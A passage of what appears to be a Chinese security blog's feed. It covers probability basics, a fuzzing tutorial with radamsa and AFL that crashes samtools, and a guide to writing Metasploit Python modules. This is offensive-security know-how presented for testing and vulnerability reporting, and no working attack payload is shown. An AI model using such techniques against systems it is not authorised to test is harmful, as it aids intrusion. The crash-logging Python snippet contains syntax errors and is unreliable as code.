<p>从全局出发  一次投掷硬币将增加一倍的可能事件 一共可能发生的有$2^3=8$  因为是单次事件得 $\frac{1}{8}$</p>
<p>得到的结果和计算难度差不多 . 但是我们换一个经典的问题</p>
<blockquote>
<blockquote>
<p>A,B二人赌博，各出赌金 a 元，他们拥有相同的获胜概率，约定，谁先获得3场胜利，谁获得 10元的全部赌注金，但是由于某种原因，赌博无法进行，此时 A获得了 2 场胜利，B获得了 1场胜利, 那么我们应该怎么把赌注分给两人才算是公平？</p>
</blockquote>
</blockquote>
<p>从单次事件出发. 下一局A获胜的概率是1/2, 如果不获胜下一轮获胜的概率也是1/2,  $\frac{1}{2}+\frac{1}{2}^2=\frac{3}{4}$</p>
<p>虽然这道题推导到这就结束了, 但是可以意识到如果离胜局越远 需要计算的越远.</p>
<p>如果从全局出发, 接下来最多可能继续赌2局, 也就是$2^2=4$ 种可能性. 如果乙要赢, 它需要的可能性只有一种. 也就是<code>1/4</code>  甲就是<code>3/4</code></p>
<p>在这里可以清楚的看到这两种思路的差异.一般人在生活中会使用从自身出发的角度, 没什么问题.但是学习统计学, 应该要熟悉的使用从全局出发的角度.</p>
<h4 id="概率之间的关系">概率之间的关系</h4>
<p>如果事件中只有a和b这两个变量.   联合概率$\rho(a, b)$ 是 a和b区域的交集在全部区域的几率.   条件概率$\rho(b|a)$ 是在a区域下, b区域占a区域的几率.  显然这两个概率的差异在于分母. 分别是全部区域和a区域. 而</p>
<p>$a区域/p(a) = 全部区域$</p>
<p>$a和b区域/p(a) = 如果全都是a区域下的b区域数量$</p>
<p>所以</p>
<p>$\rho(b|a) /\rho(a) =\rho(b) $</p>
<p>$p(a,b)/p(a) = p(b|a)$</p>
<h3 id="常用公式">常用公式</h3>
<p>如果从全局出发, 本质是排列组合问题. n个中选择m个的问题.</p>
<p>投掷5次硬币3次是正面的概率, 就是在5次中3次是正面的组合数除以所有可能性.</p>
<p>投掷N次的所有可能性非常好计算 <code>单次可能性数量的N次方</code></p>
<p>公式有几种导出思路.</p>
<p>首先有排列公式 排列与所有可能性的差异在于 每次选择后单次可能性-1  假设n次   排列的是r个</p>
<p>​     $P(n, r) = n(n-1)(n-2)&hellip;(n-r+1)  = n! / (n − r)!$</p>
<p>组合则是不再考虑顺序, 一个组合内的任何可能性都是一样的.所以我们知道一个组合的可能性乘以组合的排列可能性$r!​$ 等于排列公式</p>
<p>$C(n, r)  = P(n, r) /r!$</p>
<p>.</p>
<h4 id="期望">期望</h4>
<p>你预期你下次考试多少分? 预期就是期望. 当你投掷一枚骰子, 出现多少点会认为投出比较大的点数了呢.</p>
<p>期望的一个数学定义是 $E(X) = \int_\Omega Xd\rho $   $\Omega$  是所有事件的集合 $Xd\rho$ 是每种事件的值$X$乘它的概率$d \rho$</p>
<p>例如投一次骰子</p>
<p>$$\operatorname{E}(X)  = 1 \cdot \frac{1}{6} + 2 \cdot \frac{1}{6} + 3 \cdot \frac{1}{6} +4 \cdot \frac{1}{6} + 5 \cdot \frac{1}{6} + 6 \cdot \frac{1}{6} = \frac{1 + 2 + 3 + 4 + 5 + 6}{6} = 3.5$$</p>
]]></content></item><item><title>Fuzz</title><link>https://blue-bird1.github.io/posts/fuzz/</link><pubDate>Sun, 02 Sep 2018 22:40:07 +0800</pubDate><guid>https://blue-bird1.github.io/posts/fuzz/</guid><description>fuzz工具非常多 如libfuzz honggfuzz KernelFuzzer 也有专注进行web fuzz的wfuzz 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用</description><content type="html"><![CDATA[<p>fuzz工具非常多 如<code>libfuzz</code> <code>honggfuzz</code> <code>KernelFuzzer</code> 也有专注进行web fuzz的<code>wfuzz</code> 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用例后异常  这次使用radamsa和afl作为这两类工具</p>
<h2 id="radamsa">radamsa</h2>
<h3 id="安装">安装</h3>
<p>官方给出的命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="c1"># please please please fuzz your programs. here is one way to get data for it:</span>
</span></span><span class="line"><span class="cl">$ sudo apt-get install gcc make git wget
</span></span><span class="line"><span class="cl">$ git clone https://gitlab.com/akihe/radamsa.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> radamsa <span class="o">&amp;&amp;</span> make <span class="o">&amp;&amp;</span> sudo make install
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;HAL 9000&#34;</span> <span class="p">|</span> radamsa
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="如何使用">如何使用</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> $ <span class="nb">echo</span> <span class="s2">&#34;aaa&#34;</span> <span class="p">|</span> radamsa
</span></span><span class="line"><span class="cl"> aaaa
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>echo &quot;aaa&quot;</code>可换成任意输出内容的命令 如<code>cat test.txt</code></p>
<p>常用选项</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-o / --output 指定输出方法
</span></span><span class="line"><span class="cl">-o -    输出到终端
</span></span><span class="line"><span class="cl">-o output.txt 输出到文件
</span></span><span class="line"><span class="cl">-o :80 网络请求 适用于对服务器程序fuzz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--seek num 指定随机数 用来方便复现
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-g | --generators  指定输入
</span></span><span class="line"><span class="cl">-g stdio 默认从命令行输出获取
</span></span><span class="line"><span class="cl">-g file filename 读文件
</span></span><span class="line"><span class="cl">-g random 随机数据
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-n 生成数量
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="fuzz-命令行程序">fuzz 命令行程序</h3>
<h4 id="从命令行读取数据">从命令行读取数据</h4>
<p>典型就是<code>md5sum</code>
测试fuzz命令例子
<code>echo &quot;test&quot; | radamsa | md5sum  - </code></p>
<p>当然不可能fuzz一次就执行一行命令 编写一个简单的脚本
shell or python? python!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os                                                                                                                                                                      
</span></span><span class="line"><span class="cl">while True:                                              
</span></span><span class="line"><span class="cl">   ret = os.system(&#39;echo &#34;test&#34; | radamsa | md5sum -&#39;)                                                                                                                       
</span></span></code></pre></td></tr></table>
</div>
</div><p>只是简单的单线程执行 但是存在两个问题 如何记录崩溃和崩溃输入 这个时候<code>-seek</code>就能使用了 同时通过判断<code>system</code>函数的返回值 修改为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os                                                                                                                               num = 0                                       
</span></span><span class="line"><span class="cl">while True:                                              
</span></span><span class="line"><span class="cl">   ret = os.system(&#39;echo &#34;test&#34; | radamsa -seek {}| md5sum -&#39;.format(num))
</span></span><span class="line"><span class="cl">   num = num +1
</span></span><span class="line"><span class="cl">   if ret != 0:
</span></span><span class="line"><span class="cl">      with open（&#34;crash.txt&#34;,&#34;w+&#34;） as f
</span></span><span class="line"><span class="cl">      f.write(&#34;{}\n&#34;.format(num))                                                                                                   
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们的第一个fuzz程序(虽然这个脚本很简陋)</p>
<h3 id="文件fuzz">文件fuzz</h3>
<p>和命令行主要区别只是读取方式和 文件格式一般会有一定要求 否则不能进入程序执行流程.所以一般fuzz严格的文件格式要使用专门的生成框架.</p>
<p>生成fuzz文件方法很简单
<code>echo &quot;test&quot; | radamsa --output 'testfile' </code></p>
<p>读取文件生成
<code>radamsa --output 'testfile'  -g file testfile </code></p>
<h3 id="网络fuzz">网络fuzz</h3>
<p>虽然<code>radmasa</code>提供了这个选项 由于协议格式基本都是一个错误字节就报错 所以推荐使用<code>Mutiny</code>来进行网络fuzz
<code>echo &quot;test&quot; | radamsa --output ':80'</code></p>
<h2 id="afl">afl</h2>
<h3 id="介绍">介绍</h3>
<p>这款工具除了可以自动从输入fuzz 还能自动检测崩溃 超时. 最大亮点是使用了 编译器插桩 在运行时通过编译时插入的代码可以了解到代码运行路径 覆盖率等信息</p>
<h3 id="安装-1">安装</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz
</span></span><span class="line"><span class="cl">tar -xf afl-latest.tgz
</span></span><span class="line"><span class="cl">cd afl*
</span></span><span class="line"><span class="cl">make
</span></span><span class="line"><span class="cl">make install
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用">使用</h3>
<p>常用参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">alf-fuzz programs
</span></span><span class="line"><span class="cl">-i 样本目录 fuzz时会使用这些样本生成fuzz文件
</span></span><span class="line"><span class="cl">-o 输出目录 生成fuzz文件存放目录
</span></span><span class="line"><span class="cl">-n 普通fuzz模式 只有检测崩溃功能 不能检测路径覆盖率
</span></span><span class="line"><span class="cl">-q qmeu模式
</span></span></code></pre></td></tr></table>
</div>
</div><p>例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">afl-fuzz  -i test/markdup/ -o out -n md5sum -  
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="实际操作">实际操作</h2>
<p>从github选一个作为实际对象 我使用高级搜索 指定&gt;500star c语言的项目后随意找了一个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/samtools/samtools
</span></span></code></pre></td></tr></table>
</div>
</div><p>实际选择指南</p>
<ol>
<li>star星数是很好的指标 代表发现的漏洞的影响力</li>
<li>选择 c/c++</li>
<li>优先选择可以直接编译成程序的 fuzz库还需要去学习怎么写成库入口程序进行fuzz</li>
<li>优先选择有完善的测试用例的 如jpg xml 或者自带</li>
<li>代码越多漏洞越多</li>
<li>如果是本地命令行程序或难以利用的程序 做好发现漏洞被忽略的准备</li>
</ol>
<p>需要使用afl-gcc执行了编译  常用将gcc替换成afl-gcc的方法 (如果不经常进行编译)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CC=你的afl路径/afl-gcc
</span></span><span class="line"><span class="cl">export CC
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">make
</span></span></code></pre></td></tr></table>
</div>
</div><p>实际使用编译工具不同 可能需要查询文档 当然你只fuzz不做其他编译直接<code>mv afl-gcc gcc</code>也行</p>
<p>编译</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt-get install autoconf automake make gcc perl zlib1g-dev libbz2-dev liblzma-dev libcurl4-gnutls-dev libssl-dev libncurses5-dev
</span></span><span class="line"><span class="cl">git clone https://github.com/samtools/htslib                                          
</span></span><span class="line"><span class="cl">git clone https://github.com/samtools/bcftools
</span></span><span class="line"><span class="cl">cd samtools
</span></span><span class="line"><span class="cl">autoheader
</span></span><span class="line"><span class="cl">autoconf -Wno-syntax
</span></span><span class="line"><span class="cl">./configure
</span></span></code></pre></td></tr></table>
</div>
</div><p>确认输出中的 <code>checking for gcc... xxxx </code> 是你的afl-fuzz 如果不是请执行上面的替换方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">make
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个程序提供了测试用例在<code>test</code>目录 如果fuzz其他程序没有提供 就需要自己寻找
需要注意几点</p>
<ol>
<li>尽量覆盖全部可能的格式</li>
<li>畸形并符合文件格式</li>
<li>不要存在大量无用数据 像一个3000像素大小的红色正方形图片比一个30像素的 在fuzz时并没有功能提升 只会让fuzz程序大量修改到没有用的图片数据区</li>
</ol>
<p>这个<code>samtools</code> 有多个功能 我们测试split这个功能 (q:为什么 a:因为我只在这个找到了崩溃 你想试试其他功能和用例也可以)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">afl-fuzz -i test/markdup/ -o out samtools split @@  
</span></span></code></pre></td></tr></table>
</div>
</div><p>稍等一会 就可以看到产生了崩溃
<img src="https://i.loli.net/2018/09/23/5ba6a9cb52673.png" alt=""></p>
<p>停止后 文件保存位置 <code>你选择的输出目录这次是out/crashes/</code></p>
<p>测试崩溃
<code>./samtools split out/crashes/id:000000,sig:11,src:000015,op:flip2,pos:2 </code>
应用崩溃了
<code>fish: “./samtools split out/crashes/id…” terminated by signal SIGSEGV (Address boundary error)</code></p>
<h2 id="之后">之后?</h2>
<p>可以选择构造exp当自己的0day 或者提交给开发者 我是倾向于提交给开发者的 而且构造exp已经有很多书籍</p>
<h3 id="提交是什么">提交是什么</h3>
<p>通知开发者程序存在问题 让开发者进行修复。</p>
<h3 id="怎么提交">怎么提交?</h3>
<p>根据程序开发者的不同 具体可能是(非全面)</p>
<ol>
<li>小型商业公司 无漏洞奖金计划  我们可以从网上找到它的联系邮件 邮件通知</li>
<li>大型商业公司 有漏洞奖金计划 使用计划中的提交方式</li>
<li>开发者 非开源  邮件通知</li>
<li>开发者 托管在github等 如果问题不大可以直接使用issue 如果是远程利用之类请通知开发者</li>
</ol>
<p>一般都需要提供以下信息</p>
<ol>
<li>os信息</li>
<li>程序版本信息</li>
<li>崩溃样本</li>
<li>其他信息</li>
</ol>
<h3 id="为什么要提交">为什么要提交?</h3>
<p>修复漏洞 防止用户收到攻击 为网络安全做贡献 当然也有其他现实因素 比如危害太小不提交也没用 简历加分等等</p>
]]></content></item><item><title>metasploit python 模块</title><link>https://blue-bird1.github.io/posts/metasploit1/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit1/</guid><description>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模</description><content type="html"><![CDATA[<p>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby</p>
<h3 id="为什么将python作为官方支持语言">为什么将python作为官方支持语言</h3>
<ol>
<li>很多不是metasploit官方人员编程的模块都是使用python编写</li>
<li>现在python流行程度非常高 很多渗透人员python熟练程度比ruby高</li>
</ol>
<h3 id="metasploit的python模块是什么">metasploit的python模块是什么</h3>
<p>主分支的一个python模块 <a href="https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py">https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py</a></p>
<p>python模块实际是通过json-rpc调用与metasploit通信</p>
<p>metasploit获取元数据如图(来自官方博客)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------+
</span></span><span class="line"><span class="cl">| Metasploit |
</span></span><span class="line"><span class="cl">|            |  Describe yourself  +-------------------+
</span></span><span class="line"><span class="cl">|            +-------------------&gt; |  some_module.py   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |   Some metadata     |                   |
</span></span><span class="line"><span class="cl">|            | &lt;-------------------+                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |                     +-------------------+
</span></span><span class="line"><span class="cl">|            |
</span></span><span class="line"><span class="cl">|            |
</span></span><span class="line"><span class="cl">+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>模块调用如图</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------+
</span></span><span class="line"><span class="cl">| Metasploit |  Do a thing with
</span></span><span class="line"><span class="cl">|            |   these options     +-------------------+
</span></span><span class="line"><span class="cl">|            +-------------------&gt; |  some_module.py   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |   A bit of status   |                   |
</span></span><span class="line"><span class="cl">|            | &lt;-------------------+                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |  Moar status        |                   |
</span></span><span class="line"><span class="cl">|            | &lt;-------------------+                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |  I found a thing    |                   |
</span></span><span class="line"><span class="cl">|            | &lt;-------------------+                   |
</span></span><span class="line"><span class="cl">|            |                     |                   |
</span></span><span class="line"><span class="cl">|            |                     +-------------------+
</span></span><span class="line"><span class="cl">|            |
</span></span><span class="line"><span class="cl">+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="将会发生什么">将会发生什么</h3>
<p>实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块</p>
<h3 id="python在metasploit能做什么">python在metasploit能做什么</h3>
<p>可以使用的和ruby模块并没有区别</p>
<h2 id="如何编写一个python模块">如何编写一个python模块</h2>
<p>首先需要导入需要的模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#!/usr/bin/env python
</span></span><span class="line"><span class="cl"># another:bluebird
</span></span><span class="line"><span class="cl">from metasploit import module
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个metasploit实际上路径是 <code>lib/msf/core/modules/external/python/</code></p>
<p>然后定义元数据 格式和ruby模块的一样.详细可参考<a href="https://www.kancloud.cn/bluebird/metasploit/486941">这里的文档</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">metadata = {
</span></span><span class="line"><span class="cl">	# 模块名字
</span></span><span class="line"><span class="cl">    &#39;name&#39;: &#39;metasploit python module demo &#39;,
</span></span><span class="line"><span class="cl">    # 模块的描述
</span></span><span class="line"><span class="cl">    &#39;description&#39;: &#39;&#39;&#39;
</span></span><span class="line"><span class="cl">        send a http request metasploit python module demo
</span></span><span class="line"><span class="cl">     &#39;&#39;&#39;,
</span></span><span class="line"><span class="cl">     # 模块作者
</span></span><span class="line"><span class="cl">    &#39;authors&#39;: [
</span></span><span class="line"><span class="cl">        &#39;bluebird&#39;, 
</span></span><span class="line"><span class="cl">    ],
</span></span><span class="line"><span class="cl">    # 编写时间
</span></span><span class="line"><span class="cl">    &#39;date&#39;: &#39;2018-02-02&#39;,
</span></span><span class="line"><span class="cl">    # 漏洞参考
</span></span><span class="line"><span class="cl">    &#39;references&#39;: [
</span></span><span class="line"><span class="cl">       
</span></span><span class="line"><span class="cl">     ],
</span></span><span class="line"><span class="cl">     # 漏洞类型 只能在已有的类型选项 
</span></span><span class="line"><span class="cl">    &#39;type&#39;: &#39;dos&#39;,
</span></span><span class="line"><span class="cl">    # 模块选项
</span></span><span class="line"><span class="cl">    &#39;options&#39;: {
</span></span><span class="line"><span class="cl">        &#39;rhost&#39;: {&#39;type&#39;: &#39;address&#39;, &#39;description&#39;: &#39;The target address&#39;, &#39;required&#39;: True, &#39;default&#39;: None},
</span></span><span class="line"><span class="cl">        &#39;rport&#39;: {&#39;type&#39;: &#39;port&#39;, &#39;description&#39;: &#39;The target port&#39;, &#39;required&#39;: True, &#39;default&#39;: 80},
</span></span><span class="line"><span class="cl">     }}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后一般应该定义一个<code>run</code>方法.这个demo输出了helloworld</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def run(args):
</span></span><span class="line"><span class="cl">    module.log(&#39;helloworld&#39;)
</span></span><span class="line"><span class="cl">   
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后定义主方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
</span></span><span class="line"><span class="cl">    module.run(metadata, run)
</span></span></code></pre></td></tr></table>
</div>
</div><p>让我们实际跑一下(注意请给你的python文件添加执行权限)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1
</span></span><span class="line"><span class="cl">rhost =&gt; 127.0.0.1
</span></span><span class="line"><span class="cl">msf5 auxiliary(test/demo) &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Starting server...
</span></span><span class="line"><span class="cl">[*] hello world
</span></span><span class="line"><span class="cl">[*] Auxiliary module execution completed
</span></span><span class="line"><span class="cl">msf5 auxiliary(test/demo) &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>metasploit python 模块是如何运行</title><link>https://blue-bird1.github.io/posts/metasploit2/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit2/</guid><description>开始 metasploit的扩展实现的代码主要在metasploit-framework/lib/msf/core/modules/exter</description><content type="html"><![CDATA[<h2 id="开始">开始</h2>
<p>metasploit的扩展实现的代码主要在<code>metasploit-framework/lib/msf/core/modules/external </code>
目录结构如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">├── bridge.rb
</span></span><span class="line"><span class="cl">├── message.rb
</span></span><span class="line"><span class="cl">├── python
</span></span><span class="line"><span class="cl">│   ├── async_timeout
</span></span><span class="line"><span class="cl">│   │   ├── __init__.py
</span></span><span class="line"><span class="cl">│   └── metasploit
</span></span><span class="line"><span class="cl">│       ├── __init__.py
</span></span><span class="line"><span class="cl">│       ├── __init__.pyc
</span></span><span class="line"><span class="cl">│       ├── module.py
</span></span><span class="line"><span class="cl">│       ├── module.pyc
</span></span><span class="line"><span class="cl">│       ├── probe_scanner.py
</span></span><span class="line"><span class="cl">├── shim.rb
</span></span><span class="line"><span class="cl">└── templates
</span></span><span class="line"><span class="cl">    ├── capture_server.erb
</span></span><span class="line"><span class="cl">    ├── common_metadata.erb
</span></span><span class="line"><span class="cl">    ├── dos.erb
</span></span><span class="line"><span class="cl">    ├── multi_scanner.erb
</span></span><span class="line"><span class="cl">    └── remote_exploit_cmd_stager.erb
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中<code>python</code>目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入<code>metasploit</code>
<code>templates</code>目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如<code>info</code>都是靠这些模板实现的.
<code>message.rb</code>和<code>bridge</code>是与msf jsonrpc通信的一些api.
<code>shim.rb</code>则是真正将python代码实现为模块的代码.</p>
<p>这里省略了不重要的细节的<code>message.rb</code>代码</p>
<div class="highlight"><div class="chroma">
